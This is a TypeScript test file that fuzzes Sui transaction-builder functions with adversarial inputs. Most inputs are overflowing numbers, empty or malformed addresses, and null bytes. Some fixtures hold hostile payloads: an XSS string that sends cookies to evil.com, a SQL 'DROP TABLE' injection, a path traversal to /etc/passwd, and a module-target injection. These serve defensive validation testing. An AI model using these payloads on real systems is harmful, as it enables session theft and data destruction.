/**
 * Monkey / extreme tests for ALL PTB builders
 * Goal: break transaction construction with adversarial inputs
 *
 * Attack vectors:
 * - Invalid address formats → tx.pure.address() should throw
 * - Empty strings for object IDs → tx.object("") behavior
 * - BigInt overflow → u64 max is 2^64-1, what happens at 2^64?
 * - NaN/Infinity in numeric fields
 * - SQL injection / path traversal in string fields
 * - Unicode/null bytes in package IDs (moveCall target injection)
 */
import { describe, it, expect } from "vitest";
import { Transaction } from "@mysten/sui/transactions";

// PTB builders
import { buildListBpo, buildBuyBpo, buildDelistBpo, buildListBpc, buildBuyBpc, buildDelistBpc } from "../../../src/lib/ptb/marketplace";
import { buildCreateWorkOrder, buildCreateOrderFromDamageReport, buildAcceptWorkOrder, buildDeliverWorkOrder, buildCompleteWorkOrder, buildCancelWorkOrder } from "../../../src/lib/ptb/workOrder";
import { buildCreateLease, buildReturnLease, buildForfeitLease, buildStartProductionWithLease } from "../../../src/lib/ptb/lease";
import { buildCreateTriggerRule, buildToggleTrigger } from "../../../src/lib/ptb/triggerEngine";
import { buildClaimFromBlueprint, buildClaimFromLease, buildClaimFromWorkOrder, buildSurrenderPass, buildAdminRevokePass } from "../../../src/lib/ptb/factoryAccess";

const VALID_ADDR = "0x" + "a".repeat(64);
const VALID_PKG = "0x" + "b".repeat(64);
const VALID_OBJ = "0x" + "c".repeat(64);

describe("PTB builders — monkey tests", () => {
  // ════════════ Marketplace ════════════

  describe("marketplace", () => {
    it("buildListBpo with price=0n", () => {
      const tx = buildListBpo(VALID_PKG, VALID_OBJ, VALID_OBJ, 0n);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildListBpo with negative price", () => {
      // u64 doesn't accept negative — SDK should throw at build time
      expect(() => buildListBpo(VALID_PKG, VALID_OBJ, VALID_OBJ, -1n)).toThrow();
    });

    it("buildListBpo with price > u64 max — SDK validates", () => {
      // SUI SDK validates u64 range and throws — good defense!
      expect(() => buildListBpo(VALID_PKG, VALID_OBJ, VALID_OBJ, 2n ** 64n)).toThrow();
    });

    it("buildBuyBpo with zero bigint price", () => {
      const tx = buildBuyBpo(VALID_PKG, VALID_OBJ, VALID_OBJ, 0n);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildBuyBpo with u64 max", () => {
      const tx = buildBuyBpo(VALID_PKG, VALID_OBJ, VALID_OBJ, 2n ** 64n - 1n);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildBuyBpo with u64 max + 1 (overflow)", () => {
      expect(() => buildBuyBpo(VALID_PKG, VALID_OBJ, VALID_OBJ, 2n ** 64n)).toThrow();
    });

    it("buildDelistBpo with empty sender address", () => {
      // tx.transferObjects([], "") — empty string as address
      expect(() => buildDelistBpo(VALID_PKG, VALID_OBJ, "")).toThrow();
    });

    it("buildDelistBpo with non-hex sender", () => {
      expect(() => buildDelistBpo(VALID_PKG, VALID_OBJ, "not-an-address")).toThrow();
    });

    it("buildDelistBpo with short address (missing chars)", () => {
      expect(() => buildDelistBpo(VALID_PKG, VALID_OBJ, "0x123")).not.toThrow();
      // SUI SDK normalizes short addresses
    });
  });

  // ════════════ Work Order ════════════

  describe("workOrder", () => {
    it("empty description string", () => {
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "", VALID_OBJ, 1, 1000n, Date.now() + 86400000, 1);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("description with SQL injection payload", () => {
      const sqli = "'; DROP TABLE work_orders; --";
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, sqli, VALID_OBJ, 1, 1000n, Date.now() + 86400000, 1);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("description with XSS payload", () => {
      const xss = '<img src=x onerror="fetch(`https://evil.com?c=`+document.cookie)">';
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, xss, VALID_OBJ, 1, 1000n, Date.now() + 86400000, 1);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("very long description (1MB)", () => {
      const mega = "X".repeat(1_000_000);
      // On-chain gas limit will reject this, but SDK should build the TX
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, mega, VALID_OBJ, 1, 1000n, Date.now() + 86400000, 1);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("quantity = 0 (Move contract should reject)", () => {
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "test", VALID_OBJ, 0, 1000n, Date.now() + 86400000, 1);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("negative quantity", () => {
      // tx.pure.u64(-1) — should throw
      expect(() =>
        buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "test", VALID_OBJ, -1, 1000n, Date.now() + 86400000, 1),
      ).toThrow();
    });

    it("escrowAmount = 0 (contract rejects, SDK builds)", () => {
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "test", VALID_OBJ, 1, 0n, Date.now() + 86400000, 1);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("negative escrow bigint", () => {
      expect(() =>
        buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "test", VALID_OBJ, 1, -1n, Date.now() + 86400000, 1),
      ).toThrow();
    });

    it("deadline in the past", () => {
      // SDK builds fine, contract should reject
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "test", VALID_OBJ, 1, 1000n, 0, 1);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("priority > 3 (out of enum range)", () => {
      // tx.pure.u8(255) is valid u8, contract should reject
      const tx = buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "test", VALID_OBJ, 1, 1000n, Date.now() + 86400000, 255);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("priority > u8 max (256)", () => {
      expect(() =>
        buildCreateWorkOrder(VALID_PKG, VALID_OBJ, "test", VALID_OBJ, 1, 1000n, Date.now() + 86400000, 256),
      ).toThrow();
    });

    it("sourceEvent with path traversal", () => {
      const tx = buildCreateOrderFromDamageReport(
        VALID_PKG, VALID_OBJ, "test", VALID_OBJ, 1, 1000n, Date.now() + 86400000,
        "../../../etc/passwd",
      );
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildDeliverWorkOrder with u32 overflow for itemTypeId", () => {
      // u32 max = 4294967295
      expect(() => buildDeliverWorkOrder(VALID_PKG, VALID_OBJ, 2 ** 32, 1)).toThrow();
    });

    it("buildDeliverWorkOrder with negative quantity", () => {
      expect(() => buildDeliverWorkOrder(VALID_PKG, VALID_OBJ, 1, -1)).toThrow();
    });
  });

  // ════════════ Lease ════════════

  describe("lease", () => {
    it("buildCreateLease with invalid lessee address", () => {
      expect(() =>
        buildCreateLease(VALID_PKG, VALID_OBJ, "not-an-address", 1000n, Date.now() + 86400000, 100),
      ).toThrow();
    });

    it("buildCreateLease with empty lessee", () => {
      expect(() =>
        buildCreateLease(VALID_PKG, VALID_OBJ, "", 1000n, Date.now() + 86400000, 100),
      ).toThrow();
    });

    it("buildCreateLease with self-lease (lessee = sender)", () => {
      // SDK won't prevent this — contract might
      const tx = buildCreateLease(VALID_PKG, VALID_OBJ, VALID_ADDR, 1000n, Date.now() + 86400000, 100);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildCreateLease with 0 deposit", () => {
      const tx = buildCreateLease(VALID_PKG, VALID_OBJ, VALID_ADDR, 0n, Date.now() + 86400000, 100);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildCreateLease with negative daily rate", () => {
      expect(() =>
        buildCreateLease(VALID_PKG, VALID_OBJ, VALID_ADDR, 1000n, Date.now() + 86400000, -1),
      ).toThrow();
    });

    it("buildCreateLease with past expiry", () => {
      const tx = buildCreateLease(VALID_PKG, VALID_OBJ, VALID_ADDR, 1000n, 0, 100);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildStartProductionWithLease with all same ID (weird but valid for SDK)", () => {
      const tx = buildStartProductionWithLease(VALID_PKG, VALID_OBJ, VALID_OBJ, VALID_OBJ);
      expect(tx).toBeInstanceOf(Transaction);
    });
  });

  // ════════════ Trigger Engine ════════════

  describe("triggerEngine", () => {
    it("threshold = 0", () => {
      const tx = buildCreateTriggerRule(VALID_PKG, VALID_OBJ, 0, 0, 1, false, 0);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("negative threshold", () => {
      expect(() => buildCreateTriggerRule(VALID_PKG, VALID_OBJ, 0, -1, 1, false, 0)).toThrow();
    });

    it("conditionType out of u8 range (999) — SDK validates", () => {
      // SUI SDK validates u8 range (0-255) and throws — good!
      expect(() => buildCreateTriggerRule(VALID_PKG, VALID_OBJ, 999, 100, 1, false, 0)).toThrow();
    });

    it("cooldown = MAX u64", () => {
      const tx = buildCreateTriggerRule(VALID_PKG, VALID_OBJ, 0, 100, 1, true, Number(2n ** 63n));
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("negative cooldown", () => {
      expect(() => buildCreateTriggerRule(VALID_PKG, VALID_OBJ, 0, 100, 1, true, -1000)).toThrow();
    });

    it("targetItemTypeId > u32 max", () => {
      expect(() => buildCreateTriggerRule(VALID_PKG, VALID_OBJ, 0, 100, 2 ** 32, false, 0)).toThrow();
    });
  });

  // ════════════ Factory Access ════════════

  describe("factoryAccess", () => {
    it("buildClaimFromBlueprint with empty sourceId — SDK accepts (chain rejects)", () => {
      // tx.object("") does NOT throw at build time — SDK normalizes empty to 0x0
      // This is a front-end validation gap: should reject before building TX
      const tx = buildClaimFromBlueprint(VALID_PKG, VALID_OBJ, "", VALID_OBJ);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("buildAdminRevokePass with invalid holder address", () => {
      expect(() =>
        buildAdminRevokePass(VALID_PKG, VALID_OBJ, VALID_OBJ, "garbage", VALID_OBJ),
      ).toThrow();
    });

    it("buildAdminRevokePass with XSS in holder", () => {
      expect(() =>
        buildAdminRevokePass(VALID_PKG, VALID_OBJ, VALID_OBJ, '<script>alert(1)</script>', VALID_OBJ),
      ).toThrow();
    });

    it("buildSurrenderPass with valid inputs", () => {
      const tx = buildSurrenderPass(VALID_PKG, VALID_OBJ, VALID_OBJ);
      expect(tx).toBeInstanceOf(Transaction);
    });
  });

  // ════════════ Cross-cutting: package ID injection ════════════

  describe("moveCall target injection", () => {
    it("package ID with :: injection (attempt to call different module)", () => {
      // If pkg = "0xABC::evil_module", target becomes "0xABC::evil_module::marketplace::list_bpo"
      // SDK should reject or it becomes invalid on-chain
      const evil = VALID_PKG + "::evil_module";
      // This will create a tx with malformed target — chain rejects at execution
      const tx = buildListBpo(evil, VALID_OBJ, VALID_OBJ, 1000n);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("empty package ID", () => {
      // target becomes "::marketplace::list_bpo"
      const tx = buildListBpo("", VALID_OBJ, VALID_OBJ, 1000n);
      expect(tx).toBeInstanceOf(Transaction);
    });

    it("package ID with null bytes", () => {
      const tx = buildListBpo("0x\0\0\0", VALID_OBJ, VALID_OBJ, 1000n);
      expect(tx).toBeInstanceOf(Transaction);
    });
  });
});
